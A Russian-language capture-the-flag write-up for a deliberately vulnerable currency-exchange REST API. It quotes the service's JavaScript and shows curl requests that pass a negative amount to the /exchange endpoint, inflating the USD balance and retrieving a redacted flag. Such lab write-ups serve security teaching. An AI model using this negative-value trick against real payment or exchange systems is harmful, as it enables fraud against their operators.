**Задание:**

В нашем подпольном обменнике валют «У Апишечки» самый выгодный курс обмена RUB/USD. Вот только интерфейс не самый удобный для пользователя – по REST api.

Адрес: https://exchange-api.t1.bug-makers.ru

---
**Решение:**

Имеем сервис по обмену валюты, идём смотреть сурсы сервиса.

На старте у нас есть 1000 USD и 0 RUB:

```js
app.use((req, res, next) => {
  if (!req.session.balance) {
    req.session.balance = {
      USD: 1000.00,
      RUB: 0.00
    };
  }
```

Чтобы получить флаг нужно обратиться к ручке `/balance`, имея при этом USD > 1000:

```js
app.get('/balance', (req, res) => {
  if(req.session.balance.USD > 1000){
    res.json({
      FLAG: FLAG_VALUE
    });  
  }else{
    res.json(req.session.balance);
  }
});
```

В ручке `/exchange` нет никаких проверок на отрицательный баланс, попробуем передать отрицательное число для обмена:

```shell
curl -X POST http://31.207.77.216:4001/exchange \
  -H "Content-Type: application/json" \
  -d '{"amount": -1, "fromCurrency": "USD", "toCurrency": "RUB"}' \
  --cookie-jar c.txt

{"message":"Exchange successful","convertedAmount":-81.31,"newBalance":{"USD":1001,"RUB":-81.31}}                                                         
```

Количество USD увеличилось, осталось забрать флаг:

```shell
curl http://31.207.77.216:4001/balance \
  --cookie c.txt

{"FLAG":"BugCTF{XXXXXXXXXXXXXXX}"} 
```